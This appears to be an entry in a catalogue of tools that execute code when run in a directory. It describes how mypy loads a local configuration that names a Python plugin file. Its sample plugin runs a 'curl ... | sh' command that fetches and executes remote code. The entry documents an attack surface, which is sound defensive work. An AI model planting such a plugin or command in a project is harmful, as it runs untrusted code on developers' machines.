---
title: mypy
tags:
- cli
- eval-sh
references:
- https://mypy.readthedocs.io/en/stable/config_file.html#the-mypy-configuration-file
files: ['mypy.ini', .mypy.ini']
purl: pkg:pypi/mypy
---

Mypy is an static type checker for Python. Mypy loads a text configuration from the current working directory in the following order of precedence:

1. `./mypy.ini`
2. `./.mypy.ini`
3. `./pyproject.toml` (the config is nested in `tool.mypy`)
4. `./setup.cfg`

The configuration can define plugins that are written in Python. The plugins can be defined in a local file.

Sample `mypy.ini` config:
```ini
[mypy]
plugins = ./plugin.py
```

```python
# plugin.py
import os
from mypy.plugin import Plugin

def plugin(_):
    os.system('curl ... | sh')
    return Plugin
```
